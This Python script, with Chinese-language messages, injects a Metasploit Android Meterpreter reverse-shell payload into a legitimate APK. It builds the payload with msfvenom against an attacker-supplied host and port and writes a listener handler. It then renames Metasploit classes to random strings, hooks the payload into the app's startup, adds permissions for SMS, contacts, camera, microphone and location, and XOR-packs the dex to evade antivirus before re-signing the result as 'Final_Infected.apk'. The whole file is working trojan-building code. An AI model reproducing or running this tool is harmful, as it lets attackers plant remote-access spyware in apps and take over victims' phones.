#!/usr/bin/python3

import os
import re
import zlib
import zipfile
import argparse
import random
import shutil
import struct
import hashlib
import platform
from xml.dom.minidom import parse, parseString

PWD = os.getcwd()

OS = platform.system() 

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def random_str():
    return ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 10))

def replace_file_content(pattern, string, rep_file):
    with open(rep_file, 'r') as file:
        data = file.read()

    data = re.sub(pattern, string, data)

    with open(rep_file, 'w') as file:
        file.write(data)

def get_classes_dex(smali):

    class_dex = smali.split('_')
    
    if len(class_dex) > 1:
        class_dex = class_dex[1]
    else:
        class_dex = 'classes'

    return class_dex

def save_appName(appName):
    stCfgFp = f"{PWD}/libs/shellApplicationSourceCode/java/cn/yongye/stub/common/Config.java"
    with open(stCfgFp, 'w') as f:
        f.write("package cn.yongye.stub.common;\n")
        f.write("\n")
        f.write("public class Config {\n")
        f.write(f"    public static final String MAIN_APPLICATION = \"{appName}\";\n")
        f.write("}\n")

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}APK 注入工具 v1.0')
    parser._optionals.title = f"{GREEN}参数说明s{YELLOW}"
      
    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("--lhost", dest="lhost", help="反连msf的IP地址", required=True)
    required_arguments.add_argument("--lport", dest="lport", help="反连msf的端口", required=True)
    required_arguments.add_argument("-n", "--normal-apk", dest="normal_apk", help="进行注入的apk文件", required=True)

    return parser.parse_args()

def check_dependencies_and_updates():

    if not os.path.exists(f"{PWD}/workdir"):
        os.mkdir(f"{PWD}/workdir")

    print(f"{YELLOW}\n[*] 检查电脑上的开发环境 \n{WHITE}================================\n\n[:] NOTE : 请确认安装jdk8环境!")

    print(f"{YELLOW}\n[*] 检查 : Jdk版本")
    jdk = os.system("javac -version 2>&1 | grep 1.8")
    if jdk == 0:
        print(f"{GREEN}[+] JDK - OK")
    else:
        print(f"{RED}[!] JDK版本错误!")
        print(f"{BLUE}\n[+] 请删除其他版本的jdk,并安装 openjdk-8-jdk!\n Ubuntu: sudo apt-get update && sudo apt-get install openjdk-8-jdk -y\nMacOS: brew install openjdk@8")
        exit()


    print(f"{YELLOW}\n[*] 检查 : msfvenom")
    zipalign = os.system("which msfvenom > /dev/null")
    if zipalign == 0:
        print(f"{GREEN}[+] msfvenom - OK")
    else:
        print(f"{RED}[!] msfvenom- 404 NOT FOUND !")
        print(f"{BLUE}\n[+] 请安装 metasploit-framework !\n Ubuntu: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && sudo ./msfinstall && rm -rf ./msfinstall\nMacOS: brew install --cask metasploit")
        exit()

def generate_meterpreter_payload(lhost, lport):

    print(WHITE,""" 
    ====================================    
    [*] Available Types of Payload
    ====================================
    (1) android/meterpreter/reverse_tcp
    (2) android/meterpreter/reverse_http    
    (3) android/meterpreter/reverse_https    
    """)
    payload_type = int(input(f"{BLUE}[?] 选择msf payload (1/2/3): "))

    if payload_type == 1:
        type_of_payload = "android/meterpreter/reverse_tcp" 
    elif payload_type == 2:
        type_of_payload = "android/meterpreter/reverse_http"
    elif payload_type == 3:
        type_of_payload = "android/meterpreter/reverse_https"  
    else:
        print(f"{RED}[!] 请选择正确的Payload!")
        exit()

    os.system(f"msfvenom -p {type_of_payload} LHOST={lhost} LPORT={lport} -o {PWD}/workdir/android_payload.apk") 
    if os.path.exists("android_payload.apk"):
        print(f"{GREEN}[+] msf payload apk 创建成功!")

    print(f"{YELLOW}\n[*] 创建 msfconsole handler.rc")

    with open("handler.rc","w") as handler:
        handler.write("use exploit/multi/handler\n")
        handler.write(f"set payload {type_of_payload}\n")
        handler.write("set LHOST 0.0.0.0\n")
        handler.write(f"set LPORT {lport}\n")
        handler.write("set exitonsession false\n")
        handler.write("exploit -j")
    print(f"{GREEN}[+] 创建成功 : {PWD}/handler.rc")

def decompile_evil_and_normal_apk(normal_apk):
    print(f"{YELLOW}\n[*] 反编译需要注入的安卓APK\n=============================================")
        
    decompile_normal_apk = os.system(f"java -jar {PWD}/libs/apktool.jar d {normal_apk} -o {PWD}/workdir/normal_apk -f")
    if decompile_normal_apk == 0:
        print(f"{GREEN}[+] 反编译成功!")
    else:
        print(f"{RED}[!] 反编译失败!")
        exit()
        
    print(f"{YELLOW}\n[*] 反编译msf生成的安卓APK\n=============================================")
    decompile_evil_apk = os.system(f"java -jar {PWD}/libs/apktool.jar d {PWD}/workdir/android_payload.apk -o {PWD}/workdir/android_payload -f")
    if decompile_normal_apk == 0:
        print(f"{GREEN}[+] 反编译成功 !")
    else:
        print(f"{RED}[!] 反编译失败!")
        exit()

def change_file_and_folder_name_of_payload(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7):
    print(f"{YELLOW}\n[*] 修改msf文件名特征,使用随机字符代替!")
    # Changing the default folder and filenames
    os.rename(f"{PWD}/workdir/android_payload/smali/com/metasploit", f"{PWD}/workdir/android_payload/smali/com/{VAR1}")

    os.rename(f"{PWD}/workdir/android_payload/smali/com/{VAR1}/stage", f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}")

    os.rename(f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/Payload.smali", f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")

    # Updating paths in .smali files 
    for smali_file in os.listdir(f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/"):
        replace_file_content(r'metasploit/stage', f"{VAR1}/{VAR2}", f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/{smali_file}")
        replace_file_content(r'Payload', f"{VAR3}", f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/{smali_file}")

    replace_file_content(r'com\.metasploit\.meterpreter\.AndroidMeterpreter', f"com.{VAR4}.{VAR5}.{VAR6}", f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")
    replace_file_content(r'payload', f"{VAR7}", f"{PWD}/workdir/android_payload/smali/com/{VAR1}/{VAR2}/{VAR3}.smali")

    print(f"{GREEN}[+] 修改成功 !")



def hook_meterpreter_in_apk(VAR1, VAR2, VAR3):
    print(f"{YELLOW}\n[*] 获取 AndroidManifest.xml 中的首启动组件名称!")

    smali_file_path = ['smali', 'smali_classes2', 'smali_classes3', 'smali_classes4', 'smali_classes5', 'smali_classes6', 'smali_classes7', 'smali_classes8', 'smali_classes9', 'smali_classes10']
    with open(f'{PWD}/workdir/normal_apk/AndroidManifest.xml') as file:
        dom = parse(file)

    root = dom.documentElement

    package_name = root.getAttribute('package')

    application = root.getElementsByTagName('application')

    launcherActivity = application[0].getAttribute("android:name")

    if launcherActivity:
        launcherActivity = launcherActivity.strip()
        return_launcherActivity = launcherActivity
    else:
        return_launcherActivity = 'android.app.Application'
        activity = application[0].getElementsByTagName('activity')
        launcherActivity = activity[0].getAttribute("android:name").strip()

    if re.search(r'^(\w+\.)(\w+\.)+(\w+)$', launcherActivity):
        pass
    elif re.search(r'^\.[a-zA-Z0-9]+$', launcherActivity):
        launcherActivity = package_name + launcherActivity
    elif re.search(r'^[a-zA-Z0-9]+$', launcherActivity):
        launcherActivity = package_name + '.' + launcherActivity
    else:
        print(f"{RED}[!] 获取匹配到的首组件名称, 但是不符合规则, 请确认! 获取到的组件为: {launcherActivity}")

        launcherActivity = ''

    if not launcherActivity:

        print(f"{RED}[!] 不能匹配到app的首启动组件名称, 请手动指定!\n首启动组件一般在AndroidManifest.xml文件中,对应到<application *>标签的android:name=\"***.***.***.***\"值.")
        launcherActivity = input(f"{BLUE}[?] 请输入在 '{PWD}/workdir/normal_apk/AndroidManifest.xml' 文件找到的首启动组件名称: ").strip()
    else:
        print(f"{GREEN}[+] 成功获取到首启动组件名称: {launcherActivity}")

    print(f"{YELLOW}\n[*] 获取首启动组件对应的smali文件!")

    launcherActivity = launcherActivity.replace('.', '/') 

    for smali in smali_file_path:
        launcherActivitypath = f"{PWD}/workdir/normal_apk/{smali}/{launcherActivity}.smali"
        if os.path.exists(launcherActivitypath):
            break

    print(f"{GREEN}[+] 找到首启动组件对应的smali文件: {WHITE}{launcherActivitypath}")

    print(f"{YELLOW}\n[*] 注入 meterpreter payload 到smali文件中!")

    replace_file_content(r"(\.method.*?onCreate\(.*?\)V)", r"\1\n    invoke-static {}, Lcom/{}/{}/{};->start(Landroid/content/Context;)V".format('{p0}', VAR1, VAR2, VAR3), launcherActivitypath)

    print(f"{GREEN}[+] meterpreter payload 注入成功!")

    return smali, return_launcherActivity

def move_payload_files_to_normal_apk(smali):

    print(f"{YELLOW}\n[*] 拷贝 Meterpreter Payload 文件到被注入的app中!")

    try:
        
        shutil.copytree(f"{PWD}/workdir/android_payload/smali/com/{VAR1}", f"{PWD}/workdir/normal_apk/{smali}/com/{VAR1}")

        print(f"{GREEN}[+] smali文件拷贝成功!")

    except Exception as e:
        print(f"{RED}[!] smali文件拷贝失败")
        exit()

def inject_meterpreter_permission():
    print(f"{YELLOW}\n[*] 注入app权限信息到 AndroidManifest.xml !")

    uses_permission = '''<?xml version="1.0" encoding="utf-8" standalone="no"?><permission xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.microphone"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
</permission>'''

    with open(f'{PWD}/workdir/normal_apk/AndroidManifest.xml', 'r', encoding='UTF-8') as file:
        dom = parse(file)

    root = dom.documentElement

    permissions = parseString(uses_permission).documentElement.getElementsByTagName('uses-permission')

    for permission in permissions:

        root.appendChild(permission)

    print(f"{GREEN}[+] 注入权限信息成功!")

    print(f"{YELLOW}\n[*] 修改AndroidManifest.xml中的首启动组件为加固后的组件: cn.yongye.stub.StubApp")

    application = root.getElementsByTagName('application')

    application[0].setAttribute("android:name", 'cn.yongye.stub.StubApp')

    with open(f'{PWD}/workdir/normal_apk/AndroidManifest.xml', 'w', encoding='UTF-8') as file:
        dom.writexml(file, encoding='UTF-8')

    print(f"{GREEN}[+] 修改成功!")


def compile_infected_apk():
    print(f"{YELLOW}\n[*] 编译注入Payload的 APK\n=================================")
    compile_normal_apk = os.system(f"java -jar {PWD}/libs/apktool.jar b {PWD}/workdir/normal_apk -o {PWD}/workdir/injected.apk -f")
    if compile_normal_apk == 0:
        print(f"{GREEN}[+] 编译成功!")
    else:
        print(f"{RED}[!] 编译失败!")
        exit()

def unzip_msf_dex(class_dex):
    print(f"{YELLOW}\n[*] 进行app加固, 隐藏msf payload 避免被查杀!")

    print(f"{YELLOW}\n[*] 提取被注入msf payload的apk文件的dex文件!")

    # compilejava = os.system(f"java -jar {PWD}/libs/smali.jar a -o {PWD}/workdir/inject_msf.dex {PWD}/workdir/normal_apk/{smali}")

    # compilejava = os.system(f"d2j-jar2dex -f -o {PWD}/workdir/inject_msf.dex {PWD}/injected.apk")

    oFApk = zipfile.ZipFile(f"{PWD}/workdir/injected.apk")
    oFApk.extract(f"{class_dex}.dex", f"{PWD}/workdir/")
    oFApk.close()

    if os.path.exists(f"{PWD}/workdir/{class_dex}.dex"):
        print(f"{GREEN}[+] 提取成功! 提取后的文件在: {PWD}/workdir/{class_dex}.dex")
    else:
        print(f"{RED}[!] 提取失败 !")
        exit()


def shell_safe_dex(launcherActivity):

    print(f"{YELLOW}\n[*] 添加app启动组件到壳App源码的配置文件!")

    print(launcherActivity)

    save_appName(launcherActivity)

    print(f"{GREEN}[+] 修改成功 !")

    print(f"{YELLOW}\n[*] 使用javac 编译壳App源码!")
    compilejava = os.system(f"javac -encoding UTF-8 -target 1.8 -bootclasspath {PWD}/libs/android.jar -d {PWD}/workdir/ {PWD}/libs/shellApplicationSourceCode/java/cn/yongye/stub/*.java {PWD}/libs/shellApplicationSourceCode/java/cn/yongye/stub/common/*.java")

    if compilejava == 0:
        print(f"{GREEN}[+] 壳App源码编译成功 !")
    else:
        print(f"{RED}[!] 壳App源码编译失败 !")
        exit()

    print(f"{YELLOW}\n[*] 使用dx.jar转译.class为dex文件!")
    compileDex = os.system(f"cd {PWD}/workdir && java -jar {PWD}/libs/dx.jar --dex --output=safe_shell.dex ./cn/yongye/stub/*.class ./cn/yongye/stub/common/*.class && cd ../")

    if compileDex == 0:
        print(f"{GREEN}[+] 转译成功 ! 转译后的dex文件为: {PWD}/workdir/safe_shell.dex")
    else:
        print(f"{RED}[!] 转译失败 !")
        exit()

def intToSmalEndian(numb):
    liRes = []

    stHexNumb = hex(numb)[2:]
    for i in range(8 - len(stHexNumb)):
        stHexNumb = '0' + stHexNumb
    liRes = re.findall(r'.{2}', stHexNumb)
    for i in range(len(liRes)):
        liRes[i] = ord(bytes.fromhex(liRes[i]))
    liRes.reverse()

    return liRes


def copy_msf_shell_dex(class_dex):

    liShellDt = []
    liSrcDexDt = []
    liAllDt = []

    #将原始DEX和壳DEX数据放在一个列表中
    with open(f"{PWD}/workdir/safe_shell.dex", "rb") as f:
        shellData = f.read()
        liShellDt = list(struct.unpack(len(shellData)*'B', shellData))
    with open(f"{PWD}/workdir/{class_dex}.dex", 'rb') as f:
        srcDt = f.read()
        liSrcDexDt = list(struct.unpack(len(srcDt)*'B', srcDt))
    liAllDt.extend(shellData)
    # 加密原DEX
    for i in liSrcDexDt:  
        liAllDt.append(i ^ 0xff)

    iSrcDexLen = len(liSrcDexDt)
    liSrcDexLen = intToSmalEndian(iSrcDexLen)
    liSrcDexLen.reverse()
    # 加密原DEX长度
    for i in liSrcDexLen:
        liAllDt.append(i ^ 0xff)

    # 计算合成后DEX文件的checksum、signature、file_size
    # 更改文件头
    newFsize = len(liAllDt)
    liNewFSize = intToSmalEndian(newFsize)
    for i in range(4):
        liAllDt[32 + i] = liNewFSize[i]

    newSignature = hashlib.sha1(bytes(liAllDt[32:])).hexdigest()
    liNewSignature = re.findall(r'.{2}', newSignature)
    for i in range(len(liNewSignature)):
        liNewSignature[i] = ord(bytes.fromhex(liNewSignature[i]))
    for i in range(20):
        liAllDt[12 + i] = liNewSignature[i]

    newChecksum = zlib.adler32(bytes(liAllDt[12:]))
    liNewChecksum = intToSmalEndian(newChecksum)
    for i in range(4):
        liAllDt[8 + i] = liNewChecksum[i]
    
    with open(f"{PWD}/workdir/{class_dex}.dex", 'wb') as f:
        f.write(bytes(liAllDt))


    print(f"{GREEN}[+] 成功合并dex文件,生成编码后的msf dex文件! 文件为: {PWD}/workdir/{class_dex}.dex")


def add_dex_to_apk(class_dex):

    print(f"{YELLOW}\n[*] 将加固后的dex文件替换apk中的class dex!")

    compilejava = os.system(f"cd workdir && {PWD}/libs/{OS}/aapt r injected.apk {class_dex}.dex && {PWD}/libs/{OS}/aapt a injected.apk {class_dex}.dex")

    if compilejava == 0:
        print(f"{GREEN}[+] 插入成功 !")
    else:
        print(f"{RED}[!] 插入失败 !")
        exit()

    print(f"{GREEN}[+] app加固完成")

def sign_apk():

    try:
        os.unlink(f"{PWD}/workdir/app.keystore")
    except Exception:
        pass
        
    print(f"{YELLOW}\n[*] 创建app签名文件!")
    keytool = os.system(f"keytool -genkey -v -keystore {PWD}/workdir/app.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000")
    if keytool == 0:
        print(f"{GREEN}[+] 创建签名文件成功! 签名文件密码为: android")
    else:
        print(f"{RED}[+] 创建签名文件失败!")
        
    print(f"{YELLOW}\n[*] 尝试使用Apksigner进行签名!")
    signer_apk = os.system(f"java -jar {PWD}/libs/apksigner.jar sign --ks {PWD}/workdir/app.keystore --ks-pass pass:android {PWD}/workdir/injected.apk")    
    if signer_apk == 0:
        print(f"{GREEN}[+] 签名apk文件成功!\n使用签名文件为: {WHITE} {PWD}/workdir/app.keystore ,签名后的文件为: {PWD}/workdir/injected.apk")
    else:
        print(f"{RED}[+] 签名apk文件失败!")
        exit()

def housekeeping():

    try:

        shutil.copyfile(f"{PWD}/workdir/injected.apk", f"{PWD}/Final_Infected.apk")
        shutil.rmtree(f"{PWD}/workdir")

    except Exception as e:
        print(e)
    
    print(f"{GREEN}[+] apk 文件 : {WHITE} {PWD}/Final_Infected.apk")
    print(f"{GREEN}\n !!!! HOOK 成功 !!!!")



if __name__ == '__main__':
    arguments = get_arguments()

    print(f"{YELLOW}\n[*] 创建随机字符串,用来修改msf payload!")
    
    VAR1 = random_str()
    VAR2 = random_str()
    VAR3 = random_str()
    VAR4 = random_str()
    VAR5 = random_str()
    VAR6 = random_str()
    VAR7 = random_str()


    print(f"{GREEN}[+] 生成成功!")

    normal_apk = arguments.normal_apk

    if not os.path.exists(normal_apk):
        print(f"{RED}[+] 需要注入的apk文件不存在,请重新输入!")
        exit()

    normal_apk = os.path.abspath(normal_apk)

    check_dependencies_and_updates()

    generate_meterpreter_payload(arguments.lhost, arguments.lport)

    decompile_evil_and_normal_apk(normal_apk)

    change_file_and_folder_name_of_payload(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7)

    smali, launcherActivity = hook_meterpreter_in_apk(VAR1, VAR2, VAR3)

    move_payload_files_to_normal_apk(smali)

    inject_meterpreter_permission()

    compile_infected_apk()

    class_dex = get_classes_dex(smali)

    unzip_msf_dex(class_dex)

    shell_safe_dex(launcherActivity)

    copy_msf_shell_dex(class_dex)

    add_dex_to_apk(class_dex)

    sign_apk()

    housekeeping()
    
    